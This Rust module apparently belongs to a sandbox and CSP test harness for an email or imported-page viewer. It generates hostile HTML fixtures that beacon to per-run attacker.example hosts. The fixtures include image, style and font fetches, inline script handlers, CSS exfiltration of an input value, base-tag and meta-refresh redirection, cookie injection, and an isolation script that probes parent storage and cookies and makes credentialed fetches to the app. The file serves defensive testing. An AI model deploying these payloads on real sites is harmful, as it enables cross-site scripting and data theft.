//! The hostile external content the content origin serves, as a mail body or an imported page
//! could carry it. Every vector aims at a URL that names the run and the vector, so a request that
//! reaches the attacker's sink, the client's API or the DNS server is attributed to exactly one
//! attempt. Placeholders: `{RUN}` the run id, `{V}` the vector name, `{H}` the vector's attacker
//! host, `{A}` the vector's attacker URL, `{APP}` the client origin, `{P}` the vector's probe URL
//! on the client's API.

use crate::json;

/// The DNS suffix whose every name resolves to the attacker's sink.
pub const ATTACKER_SUFFIX: &str = "attacker.example";

/// How the harness judges a vector of the passive fixture.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Kind {
    /// Fetches a remote URL: blocked when the sink sees no request, no TLS handshake and no DNS
    /// query; reported when a CSP report names the vector's host.
    Remote,
    /// Fetches the client's API: blocked when the Gateway logs no probe request.
    App,
    /// Inline style that would fetch a remote URL: blocked like `Remote`; the report, if any, is
    /// an inline style violation.
    InlineStyle,
    /// Inline script or event handler: blocked when its marker attribute is absent and the sink
    /// sees nothing.
    Script,
    /// DNS prefetch: blocked when the DNS server sees no query for the vector's host.
    Dns,
    /// Preconnect: blocked when the DNS server and the sink see nothing.
    Preconnect,
    /// A `<base>` element that would redirect relative URLs to the attacker.
    Base,
    /// `<meta http-equiv=set-cookie>`: blocked when the browser holds no injected cookie.
    Cookie,
    /// A `data:` frame that would load a remote URL.
    Data,
}

impl Kind {
    fn name(self) -> &'static str {
        match self {
            Self::Remote => "remote",
            Self::App => "app",
            Self::InlineStyle => "inline-style",
            Self::Script => "script",
            Self::Dns => "dns",
            Self::Preconnect => "preconnect",
            Self::Base => "base",
            Self::Cookie => "cookie",
            Self::Data => "data",
        }
    }
}

/// One attempt of the passive fixture.
pub struct Vector {
    pub name: &'static str,
    pub kind: Kind,
    /// The CSP directive expected to block it, empty when CSP does not govern it.
    pub directive: &'static str,
    /// Markup placed in `<head>`.
    pub head: &'static str,
    /// Markup placed in `<body>`.
    pub body: &'static str,
}

const MARK: &str = "document.body.setAttribute('data-pwned-{V}','1');new Image().src='{A}'";

/// Every attempt that needs no user action, served together as the `passive` fixture.
pub const PASSIVE: &[Vector] = &[
    v(
        Kind::Remote,
        "img",
        "img-src",
        "",
        r#"<img src="{A}" alt="">"#,
    ),
    v(
        Kind::Remote,
        "img-srcset",
        "img-src",
        "",
        r#"<img srcset="{A} 1x" alt="">"#,
    ),
    v(
        Kind::Remote,
        "picture-source",
        "img-src",
        "",
        r#"<picture><source srcset="{A}"><img alt=""></picture>"#,
    ),
    v(
        Kind::Remote,
        "input-image",
        "img-src",
        "",
        r#"<input type="image" src="{A}" alt="">"#,
    ),
    v(
        Kind::Remote,
        "video-poster",
        "img-src",
        "",
        r#"<video poster="{A}" width="10" height="10"></video>"#,
    ),
    v(
        Kind::Remote,
        "svg-image",
        "img-src",
        "",
        r#"<svg width="10" height="10"><image href="{A}" width="10" height="10"/></svg>"#,
    ),
    v(
        Kind::Remote,
        "video-src",
        "media-src",
        "",
        r#"<video src="{A}" preload="auto"></video>"#,
    ),
    v(
        Kind::Remote,
        "audio-src",
        "media-src",
        "",
        r#"<audio src="{A}" preload="auto"></audio>"#,
    ),
    v(
        Kind::Remote,
        "object",
        "object-src",
        "",
        r#"<object data="{A}" width="10" height="10"></object>"#,
    ),
    v(
        Kind::Remote,
        "embed",
        "object-src",
        "",
        r#"<embed src="{A}" width="10" height="10">"#,
    ),
    v(
        Kind::Remote,
        "iframe",
        "frame-src",
        "",
        r#"<iframe src="{A}"></iframe>"#,
    ),
    v(
        Kind::Remote,
        "link-stylesheet",
        "style-src",
        r#"<link rel="stylesheet" href="{A}">"#,
        "",
    ),
    v(
        Kind::Remote,
        "link-preload-font",
        "font-src",
        r#"<link rel="preload" as="font" type="font/woff2" crossorigin href="{A}">"#,
        "",
    ),
    v(
        Kind::Remote,
        "link-prefetch",
        "default-src",
        r#"<link rel="prefetch" href="{A}">"#,
        "",
    ),
    v(
        Kind::Remote,
        "link-modulepreload",
        "script-src",
        r#"<link rel="modulepreload" href="{A}">"#,
        "",
    ),
    v(
        Kind::Remote,
        "script-src",
        "script-src",
        "",
        r#"<script src="{A}"></script>"#,
    ),
    v(
        Kind::InlineStyle,
        "style-import",
        "style-src",
        "",
        r#"<style>@import url("{A}");</style>"#,
    ),
    v(
        Kind::InlineStyle,
        "style-background",
        "style-src",
        "",
        r#"<style>#marker{background-image:url("{A}")}</style>"#,
    ),
    v(
        Kind::InlineStyle,
        "style-attribute",
        "style-src",
        "",
        r#"<div style="width:10px;height:10px;background-image:url('{A}')"></div>"#,
    ),
    v(
        Kind::InlineStyle,
        "css-exfil",
        "style-src",
        "",
        r#"<input id="secret" value="s3cret"><style>input[value^="s"]{background-image:url("{A}")}</style>"#,
    ),
    v(
        Kind::InlineStyle,
        "font-face",
        "style-src",
        "",
        r#"<style>@font-face{font-family:hostile;src:url("{A}")}#marker{font-family:hostile}</style>"#,
    ),
    v(
        Kind::Script,
        "script-inline",
        "script-src",
        "",
        concat!("<script>", "{MARK}", "</script>"),
    ),
    v(
        Kind::Script,
        "handler-onerror",
        "script-src",
        "",
        r#"<img src="data:," alt="" onerror="{MARK}">"#,
    ),
    v(
        Kind::Script,
        "handler-svg-onload",
        "script-src",
        "",
        r#"<svg width="1" height="1" onload="{MARK}"></svg>"#,
    ),
    v(
        Kind::Script,
        "handler-ontoggle",
        "script-src",
        "",
        r#"<details open ontoggle="{MARK}"><summary>s</summary></details>"#,
    ),
    v(
        Kind::App,
        "app-img",
        "img-src",
        "",
        r#"<img src="{P}" alt="">"#,
    ),
    v(
        Kind::App,
        "app-iframe",
        "frame-src",
        "",
        r#"<iframe src="{P}"></iframe>"#,
    ),
    v(
        Kind::App,
        "app-prefetch",
        "default-src",
        r#"<link rel="prefetch" href="{P}">"#,
        "",
    ),
    v(
        Kind::Data,
        "data-iframe",
        "frame-src",
        "",
        r#"<iframe src="data:text/html,%3Cimg%20src%3D%22{A}%22%3E"></iframe>"#,
    ),
    v(
        Kind::Dns,
        "dns-prefetch",
        "",
        r#"<link rel="dns-prefetch" href="https://{H}">"#,
        "",
    ),
    v(
        Kind::Preconnect,
        "preconnect",
        "",
        r#"<link rel="preconnect" href="https://{H}">"#,
        "",
    ),
    v(
        Kind::Cookie,
        "meta-set-cookie",
        "",
        r#"<meta http-equiv="set-cookie" content="injected_{RUN}=1; Path=/">"#,
        "",
    ),
    v(
        Kind::Base,
        "base",
        "base-uri",
        r#"<base href="https://{H}/v/base/">"#,
        r#"<img src="base-relative" alt="">"#,
    ),
];

const fn v(
    kind: Kind,
    name: &'static str,
    directive: &'static str,
    head: &'static str,
    body: &'static str,
) -> Vector {
    Vector {
        name,
        kind,
        directive,
        head,
        body,
    }
}

/// A fixture that holds one attempt, most of them needing a click on `#go`. The fixture name is
/// also the vector name.
pub struct Single {
    pub name: &'static str,
    pub head: &'static str,
    pub body: &'static str,
}

/// Every single-attempt fixture.
pub const SINGLES: &[Single] = &[
    s(
        "meta-refresh",
        r#"<meta http-equiv="refresh" content="0;url={A}">"#,
        "",
    ),
    s(
        "click-top",
        "",
        r#"<a id="go" target="_top" href="{A}">go</a>"#,
    ),
    s(
        "click-blank",
        "",
        r#"<a id="go" target="_blank" href="{A}">go</a>"#,
    ),
    s(
        "click-javascript",
        "",
        r#"<a id="go" href="javascript:document.body.setAttribute('data-pwned-{V}','1')">go</a>"#,
    ),
    s(
        "click-ping",
        "",
        r##"<a id="go" href="#clicked" ping="{A}">go</a>"##,
    ),
    s(
        "click-base",
        r#"<base href="https://{H}/v/">"#,
        r#"<a id="go" href="relative-target">go</a>"#,
    ),
    s("click-link", "", r#"<a id="go" href="{A}">go</a>"#),
    s(
        "form-get",
        "",
        r#"<form action="{A}"><input name="q" value="secret"><button id="go">send</button></form>"#,
    ),
    s(
        "form-post-app",
        "",
        r#"<form method="post" action="{APP}/api/action?run={RUN}"><input name="q" value="x"><button id="go">send</button></form>"#,
    ),
    s(
        "click-app-get",
        "",
        r#"<a id="go" href="{APP}/api/state?run={RUN}">go</a>"#,
    ),
    s("isolation", "", ISOLATION_SCRIPT),
];

const fn s(name: &'static str, head: &'static str, body: &'static str) -> Single {
    Single { name, head, body }
}

/// Runs only where scripts are allowed (the `scripts` control mode): each probe of the
/// sandbox's origin isolation reports its outcome to the sink as a query parameter.
const ISOLATION_SCRIPT: &str = r#"<script>
(function () {
  var base = 'https://{H}/v/isolation?';
  function beacon(k, v) { new Image().src = base + encodeURIComponent(k) + '=' + encodeURIComponent(v); }
  function probe(k, f) {
    var v;
    try { v = 'allowed:' + String(f()).slice(0, 60); } catch (e) { v = 'denied:' + e.name; }
    beacon(k, v);
  }
  beacon('script', 'ran');
  probe('parent_dom', function () { return parent.document.documentElement.outerHTML.length; });
  probe('parent_storage', function () { return parent.localStorage.length; });
  probe('own_storage', function () { return localStorage.length; });
  probe('own_cookie', function () { return document.cookie; });
  probe('top_location_read', function () { return top.location.href; });
  probe('window_open', function () {
    var w = window.open('https://{RUN}-popup.{S}/v/popup');
    if (!w) { throw new TypeError('null window'); }
    return 'window';
  });
  parent.postMessage('hostile-{RUN}', '*');
  beacon('postmessage', 'sent');
  fetch('{APP}/api/state?run={RUN}', { credentials: 'include' })
    .then(function (r) { return r.text(); })
    .then(function (t) { beacon('fetch_read', 'allowed:' + t.slice(0, 40)); },
          function (e) { beacon('fetch_read', 'denied:' + e.name); });
  fetch('{APP}/api/action?run={RUN}', { method: 'POST', credentials: 'include', mode: 'no-cors', body: 'x' })
    .then(function () { beacon('fetch_post', 'sent'); },
          function (e) { beacon('fetch_post', 'denied:' + e.name); });
  setTimeout(function () {
    probe('top_navigate', function () { top.location.href = 'https://{RUN}-topnav.{S}/v/topnav'; return 'assigned'; });
  }, 500);
})();
</script>"#;

/// A run id: 1 to 24 lowercase ASCII letters or digits, so it can sit in a DNS label.
pub fn valid_run(run: &str) -> bool {
    (1..=24).contains(&run.len())
        && run
            .bytes()
            .all(|b| b.is_ascii_lowercase() || b.is_ascii_digit())
}

fn fill(template: &str, run: &str, vector: &str, app_origin: &str) -> String {
    let host = format!("{run}-{vector}.{ATTACKER_SUFFIX}");
    template
        .replace("{MARK}", MARK)
        .replace("{A}", &format!("https://{host}/v/{vector}"))
        .replace("{H}", &host)
        .replace("{P}", &format!("{app_origin}/api/probe/{vector}?run={run}"))
        .replace("{APP}", app_origin)
        .replace("{RUN}", run)
        .replace("{V}", vector)
        .replace("{S}", ATTACKER_SUFFIX)
}

fn document(fixture: &str, head: &str, body: &str) -> String {
    format!(
        "<!doctype html>\n<html><head><meta charset=\"utf-8\"><title>external content</title>\n{head}\n\
         </head><body>\n<p id=\"marker\">external content {fixture}</p>\n{body}\n</body></html>\n"
    )
}

/// The passive fixture without any `<link>` element (test-only): does removing the elements
/// close what CSP cannot (preconnect, DNS prefetch)? The vectors it drops are those whose markup
/// holds a `<link>` element.
pub const PASSIVE_WITHOUT_LINKS: &str = "passive-nolink";

/// `only-<vector>`: one passive vector served alone, so its reports and requests cannot be
/// confused with another vector's.
pub const ONLY_PREFIX: &str = "only-";

fn has_link_element(v: &Vector) -> bool {
    v.head.contains("<link") || v.body.contains("<link")
}

fn passive_parts(vectors: &[&Vector], run: &str, app_origin: &str) -> (String, String) {
    let head: Vec<String> = vectors
        .iter()
        .map(|v| fill(v.head, run, v.name, app_origin))
        .collect();
    let body: Vec<String> = vectors
        .iter()
        .map(|v| fill(v.body, run, v.name, app_origin))
        .collect();
    (head.join("\n"), body.join("\n"))
}

/// The hostile part of fixture `name` for `run`, as the markup for `<head>` and for `<body>`, or
/// `None` for an unknown fixture or an invalid run id.
pub fn render_parts(name: &str, run: &str, app_origin: &str) -> Option<(String, String)> {
    if !valid_run(run) {
        return None;
    }
    if name == "passive" {
        let all: Vec<&Vector> = PASSIVE.iter().collect();
        return Some(passive_parts(&all, run, app_origin));
    }
    if name == PASSIVE_WITHOUT_LINKS {
        let kept: Vec<&Vector> = PASSIVE.iter().filter(|v| !has_link_element(v)).collect();
        return Some(passive_parts(&kept, run, app_origin));
    }
    if let Some(vector) = name.strip_prefix(ONLY_PREFIX) {
        let v = PASSIVE.iter().find(|v| v.name == vector)?;
        return Some(passive_parts(&[v], run, app_origin));
    }
    let single = SINGLES.iter().find(|s| s.name == name)?;
    Some((
        fill(single.head, run, name, app_origin),
        fill(single.body, run, name, app_origin),
    ))
}

/// The fixture `name` for `run` as served unsanitized: the hostile markup in the document shell.
pub fn render(name: &str, run: &str, app_origin: &str) -> Option<String> {
    let (head, body) = render_parts(name, run, app_origin)?;
    Some(document(name, &head, &body))
}

/// The fixture `name` for `run` as the production content origin serves it: the hostile markup
/// (head and body together, as a mail body arrives) through the sanitizer, inside the Gateway's
/// own document shell.
pub fn render_sanitized(name: &str, run: &str, app_origin: &str) -> Option<String> {
    let (head, body) = render_parts(name, run, app_origin)?;
    Some(document(
        name,
        "",
        &crate::sanitize::sanitize(&format!("{head}\n{body}")),
    ))
}

/// The page the sink serves when a click navigates the iframe to it: a script beacon and an image
/// beacon, to show whether the iframe's sandbox still applies after a user navigation.
pub fn sink_page(run: &str) -> String {
    format!(
        "<!doctype html><html><head><meta charset=\"utf-8\"><title>attacker</title></head><body>\
         <p id=\"sink\">attacker page</p>\
         <script>new Image().src='https://{run}-sink-script.{ATTACKER_SUFFIX}/v/sink-script';</script>\
         <img src=\"https://{run}-sink-img.{ATTACKER_SUFFIX}/v/sink-img\" alt=\"\"></body></html>"
    )
}

/// The vector catalogue as JSON, so the harness derives its checks from this file.
pub fn catalogue_json() -> String {
    let passive: Vec<String> = PASSIVE
        .iter()
        .map(|v| {
            json::Object::default()
                .str("name", v.name)
                .str("kind", v.kind.name())
                .str("directive", v.directive)
                .finish()
        })
        .collect();
    let singles: Vec<String> = SINGLES.iter().map(|s| json::string(s.name)).collect();
    let without_links: Vec<String> = PASSIVE
        .iter()
        .filter(|v| has_link_element(v))
        .map(|v| json::string(v.name))
        .collect();
    format!(
        "{{\"passive\":{},\"singles\":{},\"without_links\":{{\"fixture\":{},\"dropped\":{}}},\"only_prefix\":{}}}",
        json::array(&passive),
        json::array(&singles),
        json::string(PASSIVE_WITHOUT_LINKS),
        json::array(&without_links),
        json::string(ONLY_PREFIX)
    )
}

#[cfg(test)]
mod tests {
    use super::*;

    const APP: &str = "https://vilicus.internal";

    #[test]
    fn run_ids_are_dns_label_safe() {
        assert!(valid_run("cc0001"));
        for bad in ["", "A1", "a-b", "a.b", "a/b", &"a".repeat(25)] {
            assert!(!valid_run(bad), "{bad}");
        }
        assert!(render("passive", "bad id", APP).is_none());
    }

    #[test]
    fn every_placeholder_is_filled() {
        let mut names = vec!["passive"];
        names.extend(SINGLES.iter().map(|s| s.name));
        for name in names {
            let html = render(name, "r1", APP).unwrap_or_default();
            assert!(!html.is_empty(), "{name}");
            for token in [
                "{A}", "{H}", "{P}", "{APP}", "{RUN}", "{V}", "{MARK}", "{S}",
            ] {
                assert!(!html.contains(token), "{name} keeps {token}");
            }
        }
        assert!(render("unknown", "r1", APP).is_none());
    }

    #[test]
    fn each_passive_vector_targets_its_own_host_or_probe() {
        let html = render("passive", "r1", APP).unwrap_or_default();
        for vector in PASSIVE {
            let host = format!("r1-{}.{ATTACKER_SUFFIX}", vector.name);
            let probe = format!("{APP}/api/probe/{}?run=r1", vector.name);
            let marker = format!("data-pwned-{}", vector.name);
            let cookie = "injected_r1";
            let found = match vector.kind {
                Kind::App => html.contains(&probe),
                Kind::Cookie => html.contains(cookie),
                Kind::Script => html.contains(&host) && html.contains(&marker),
                _ => html.contains(&host),
            };
            assert!(found, "{} has no attributable target", vector.name);
        }
    }

    #[test]
    fn vector_names_are_unique_dns_labels() {
        let mut names: Vec<&str> = PASSIVE.iter().map(|v| v.name).collect();
        names.extend(SINGLES.iter().map(|s| s.name));
        let count = names.len();
        names.sort_unstable();
        names.dedup();
        assert_eq!(names.len(), count);
        for name in names {
            assert!(
                name.bytes()
                    .all(|b| b.is_ascii_lowercase() || b.is_ascii_digit() || b == b'-'),
                "{name}"
            );
        }
    }

    #[test]
    fn variants_keep_or_drop_exactly_the_expected_vectors() {
        let nolink = render(PASSIVE_WITHOUT_LINKS, "r1", APP).unwrap_or_default();
        assert!(!nolink.contains("<link"));
        for v in PASSIVE {
            let host = format!("r1-{}.{ATTACKER_SUFFIX}", v.name);
            let kept =
                nolink.contains(&host) || nolink.contains(&format!("/api/probe/{}?", v.name));
            if v.kind != Kind::Cookie {
                assert_eq!(kept, !has_link_element(v), "{}", v.name);
            }
            let only = render(&format!("{ONLY_PREFIX}{}", v.name), "r1", APP).unwrap_or_default();
            assert!(!only.is_empty(), "{}", v.name);
            for other in PASSIVE.iter().filter(|o| o.name != v.name) {
                assert!(
                    !only.contains(&format!("r1-{}.", other.name)),
                    "only-{} holds {}",
                    v.name,
                    other.name
                );
            }
        }
        assert!(render("only-nope", "r1", APP).is_none());
    }

    #[test]
    fn catalogue_lists_every_vector() {
        let catalogue = catalogue_json();
        for vector in PASSIVE {
            assert!(catalogue.contains(&format!("\"name\":\"{}\"", vector.name)));
        }
        for single in SINGLES {
            assert!(catalogue.contains(&format!("\"{}\"", single.name)));
        }
    }
}
